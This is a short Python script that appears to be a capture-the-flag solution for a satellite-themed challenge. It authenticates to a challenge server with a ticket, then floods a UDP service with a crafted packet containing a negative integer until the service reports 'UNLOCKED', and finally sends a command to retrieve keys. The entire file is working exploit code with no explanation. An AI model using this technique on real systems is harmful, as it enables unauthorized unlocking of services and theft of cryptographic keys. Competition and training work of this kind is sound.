import struct
import socket

TICKET = b'ticket{delta58516uniform2:GHf8rGYslzNa2UYz36jcT7-KjgRZhAZgyVsLP-LR0fG6O_LaQuZutsxBCXoAP3BhLA}\n'

COMMAND_GETKEYS = 9

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('lucky-tree.satellitesabove.me', 5008))
s.recv(1024)
s.send(TICKET)
service = s.recv(1024).split(b'udp:')[1].strip().split(b':')

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

payload = struct.pack('hhi', 1, 1, -8)
for i in range(0, 255):
    s.sendto(payload, (service[0], int(service[1])))
    res = s.recvfrom(1024)
    print(i, res)
    if b'UNLOCKED' in res[0]:
        payload = struct.pack('hhi', 1, 1, COMMAND_GETKEYS)
        s.sendto(payload, (service[0], int(service[1])))
        print(s.recvfrom(1024))
